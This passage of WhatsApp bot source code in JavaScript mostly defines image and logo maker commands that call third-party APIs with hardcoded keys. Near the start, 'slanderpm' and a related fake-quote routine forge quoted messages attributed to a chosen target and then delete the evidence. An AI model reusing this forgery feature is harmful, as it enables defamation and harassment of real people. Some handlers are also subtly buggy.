            var bot = gh.split("|")[2];
            pemuda.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
            if(!q) return freply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            freply(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'slanderpm':
            //if (!isRegister) return freply(mess.only.regis)    
            if(!q) return freply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await pemuda.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await pemuda.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isQuotedVideo) return freply('Reply videonya!')
            freply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await pemuda.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return freply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            pemuda.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break            
    case 'ytgold': 
            //if (!isRegister) return freply(mess.only.regis)     
            if (args.length < 1) return freply(`*${prefix}${command} Chandra*`)
            F = body.slice(8)
            freply(mess.wait)
            anu = await getBuffer(`https://api.zeks.me/api/gplaybutton?text=${F}&apikey=Alphabott`)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(anu, "imageMessage", { thumbnail: anu, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
            break
    case 'ytsilver': 
            //if (!isRegister) return freply(mess.only.regis)          
            if (args.length < 1) return freply(`*${prefix}${command} Chandra*`)
            F = body.slice(10)
            freply(mess.wait)
            anu = await getBuffer(`https://api.zeks.me/api/splaybutton?text=${F}&apikey=Alphabott`)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(anu, "imageMessage", { thumbnail: anu, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
            break
    case 'logoa': 
            //if (!isRegister) return freply(mess.only.regis)          
            if (args.length < 1) return freply(`*${prefix}${command} WAKK&BOTZ*`)
            var F = body.slice(7)
	        var F1 = F.split("&")[0];
	        var F2 = F.split("&")[1]; 
            freply(mess.wait)
            anu = await getBuffer(`https://api.zeks.me/api/logoaveng?text1=${F1}&text2=${F2}&apikey=Alphabott`)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(anu, "imageMessage", { thumbnail: anu, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
            break
    case 'pornhub': 
            //if (!isRegister) return freply(mess.only.regis)          	
            if (args.length < 1) return freply(`*${prefix}${command} WAKK&BOTZ*`)
            var F = body.slice(9)
    	    var F1 = F.split("&")[0];
	        var F2 = F.split("&")[1]; 
            freply(mess.wait)
            anu = await getBuffer(`https://api.zeks.me/api/phlogo?text1=${F1}&text2=${F2}&apikey=Alphabott`)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(anu, "imageMessage", { thumbnail: anu, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
            break
    case 'marvel': 
            //if (!isRegister) return freply(mess.only.regis)          	
            if (args.length < 1) return freply(`*${prefix}${command} WAKK&BOTZ*`)
            var F = body.slice(8)
		    var F1 = F.split("&")[0];
		    var F2 = F.split("&")[1]; 
            freply(mess.wait)
            anu = await getBuffer(`https://api.zeks.me/api/marvellogo?text1=${F1}&text2=${F2}&apikey=Alphabott`)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(anu, "imageMessage", { thumbnail: anu, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
            break
    case 'harta':
    case 'tahta': 
            //if (!isRegister) return freply(mess.only.regis)          	
            if (args.length < 1) return freply(`*${prefix}${command} Chandra*`)
            F = body.slice(7)
            freply(mess.wait)
            anu = await getBuffer(`https://api.dapuhy.ga/api/maker/hartatahta?text=${F}&apikey=${dapapi}`)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(anu, "imageMessage", { thumbnail: anu, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
            break
    case 'nuliskiri':
            //if (!isRegister) return freply(mess.only.regis)         
            if (!q) return freply('Textnya mana gan?')
            freply(mess.wait)
            kon = (`https://hardianto-chan.herokuapp.com/api/nuliskiri?text=${q}&apikey=hardianto`)
            anu = await getBuffer(kon)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(anu, "imageMessage", { thumbnail: anu, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
            break
    case 'nuliskanan':
            //if (!isRegister) return freply(mess.only.regis)         
            if (!q) return freply('Textnya mana gan?')
            freply(mess.wait)
            kon = (`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${q}&apikey=hardianto`)
            anu = await getBuffer(kon)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(anu, "imageMessage", { thumbnail: anu, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
            break
    case 'foliokanan':
            //if (!isRegister) return freply(mess.only.regis)         
            if (!q) return freply('Textnya mana gan?')
            freply(mess.wait)
            kon = (`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${q}&apikey=hardianto`)
            anu = await getBuffer(kon)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(anu, "imageMessage", { thumbnail: anu, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
            break
    case 'foliokiri':
            //if (!isRegister) return freply(mess.only.regis)         
            if (!q) return freply('Textnya mana gan?')
            freply(mess.wait)
            kon = (`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${q}&apikey=hardianto`)
            anu = await getBuffer(kon)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(anu, "imageMessage", { thumbnail: anu, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
            break    
    case 'maker2d2': 
            //if (!isRegister) return freply(mess.only.regis)         
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.results)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(anu, "imageMessage", { thumbnail: anu, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
    case 'maker2d3': 
            //if (!isRegister) return freply(mess.only.regis)         
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.results)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
    case 'maker2d4': 
            //if (!isRegister) return freply(mess.only.regis)         
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.results)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'maker3d':
            //if (!isRegister) return freply(mess.only.regis)     	 
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = body.slice(8)
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.results)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'maker3d2': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.results)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'maker3d3': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.results)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'maker3d4': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.results)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
		    break
	case 'transformer': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.results)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'googletxt':
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} tsukasa|chan|kawai`)
			makell = args.join(" ")
			ll1 = makell.split("|")[0];
			ll2 = makell.split("|")[1];
			ll3 = makell.split("|")[0];
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'battlefield': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} Yuzzu|Kamiyaka`)
			makell = args.join(" ")
			ll1 = makell.split("|")[0];
			ll2 = makell.split("|")[1];
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'coffeecup': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'coffeecup2': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'neon': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
 		    makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
    case 'glow': 
            //if (!isRegister) return freply(mess.only.regis)         
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'summer': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'flower': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=flower&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'burn': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'quote': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'wooden': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
			break
	case 'golden': 
            //if (!isRegister) return freply(mess.only.regis)     	
            if (args.length < 1) return freply(`*Example :*\n${prefix}${command} CHANDRA`)
			makell = args.join(" ")
			freply(mess.wait)
			anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=${xchillds}`)
			buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
	 	    break                        
    case 'wall':  
            //if (!isRegister) return freply(mess.only.regis)         
            if (args.length < 1) return freply(`*${prefix}${command} Chandra*`)
            F = body.slice(6)
            freply(mess.wait)
            anu = await getBuffer(`https://api.zeks.me/api/breakwall?apikey=Alphabott&text=${F}`)
            buffer1 = await getBuffer(anu.result.url)
            buttons = [{buttonId: `89`,buttonText:{displayText: `Makasih !`},type:1}]
